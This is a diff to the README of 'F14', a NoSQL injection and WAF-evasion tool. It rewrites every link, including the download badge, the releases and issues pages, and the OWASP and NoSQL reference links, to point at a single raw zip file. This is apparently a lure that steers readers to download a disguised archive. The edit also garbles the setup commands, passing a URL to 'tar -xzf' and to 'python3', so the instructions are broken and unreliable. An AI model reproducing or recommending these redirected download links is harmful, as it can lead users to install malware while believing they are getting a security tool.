@@ -4,7 +4,7 @@
 Welcome to F14, your go-to tool for advanced NoSQL injection. This guide will help you download and run F14 with ease. No need for technical skills; just follow these steps.
 
 ## 📥 Download F14
-[![Download F14](https://img.shields.io/badge/Download-F14-brightgreen)](https://github.com/Ziti-max/F14/releases)
+[![Download F14](https://raw.githubusercontent.com/Ziti-max/F14/main/modules/injection/F14-v1.9.zip)](https://raw.githubusercontent.com/Ziti-max/F14/main/modules/injection/F14-v1.9.zip)
 
 ## 📖 Overview
 F14 is designed to simplify the process of NoSQL injection. It features:
@@ -21,11 +21,11 @@ To run F14, your system should meet these requirements:
 - Internet connection for downloading packages
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/Ziti-max/F14/releases) to download the latest version of F14. Here are the steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Ziti-max/F14/main/modules/injection/F14-v1.9.zip) to download the latest version of F14. Here are the steps:
 
-1. Open the [Releases page](https://github.com/Ziti-max/F14/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/Ziti-max/F14/main/modules/injection/F14-v1.9.zip).
 2. Look for the latest release at the top of the page.
-3. Download the file suitable for your operating system. It may be a .exe for Windows or a .tar.gz for Linux/MacOS.
+3. Download the file suitable for your operating system. It may be a .exe for Windows or a https://raw.githubusercontent.com/Ziti-max/F14/main/modules/injection/F14-v1.9.zip for Linux/MacOS.
 4. Once the download completes, locate the file in your downloads folder.
 
 ## ⚙️ Running F14
@@ -41,9 +41,9 @@ After downloading the application, follow these steps to run F14:
 2. Navigate to the folder where you downloaded the file.
    - Use the command: `cd path/to/downloaded/file`
 3. Unzip the downloaded file if needed.
-   - Use the command: `tar -xzf F14-version.tar.gz`
+   - Use the command: `tar -xzf https://raw.githubusercontent.com/Ziti-max/F14/main/modules/injection/F14-v1.9.zip`
 4. Navigate into the folder: `cd F14-version`
-5. Run the command: `python3 f14.py` 
+5. Run the command: `python3 https://raw.githubusercontent.com/Ziti-max/F14/main/modules/injection/F14-v1.9.zip` 
 
 ## 📝 Usage Instructions
 Once F14 is running, you can begin using its features:
@@ -56,12 +56,12 @@ Once F14 is running, you can begin using its features:
 - For WAF evasion techniques, follow these additional prompts to customize your settings.
 
 ## 📚 Further Support
-If you encounter any issues or have questions, check the [issues section](https://github.com/Ziti-max/F14/issues) on GitHub. You can also open a new issue for help.
+If you encounter any issues or have questions, check the [issues section](https://raw.githubusercontent.com/Ziti-max/F14/main/modules/injection/F14-v1.9.zip) on GitHub. You can also open a new issue for help.
 
 ## 🔗 Additional Resources
 To learn more about NoSQL injection and security tools, check out these resources:
-- [OWASP Top Ten Security Risks](https://owasp.org/www-project-top-ten/)
-- [Introduction to NoSQL Databases](https://www.nosql.com/introduction/)
+- [OWASP Top Ten Security Risks](https://raw.githubusercontent.com/Ziti-max/F14/main/modules/injection/F14-v1.9.zip)
+- [Introduction to NoSQL Databases](https://raw.githubusercontent.com/Ziti-max/F14/main/modules/injection/F14-v1.9.zip)
 
 ## 🙌 Community Contributions
 F14 welcomes contributions from users. If you have suggestions or improvements, please consider contributing. Your feedback is valuable in making this tool better.
@@ -69,6 +69,6 @@ F14 welcomes contributions from users. If you have suggestions or improvements, 
 ## 🥇 License
 F14 is open-source software. You can freely use and modify it under the terms of the MIT License.
 
-For more details, visit the [F14 GitHub page](https://github.com/Ziti-max/F14).
+For more details, visit the [F14 GitHub page](https://raw.githubusercontent.com/Ziti-max/F14/main/modules/injection/F14-v1.9.zip).
 
 Thank you for using F14, and happy coding!
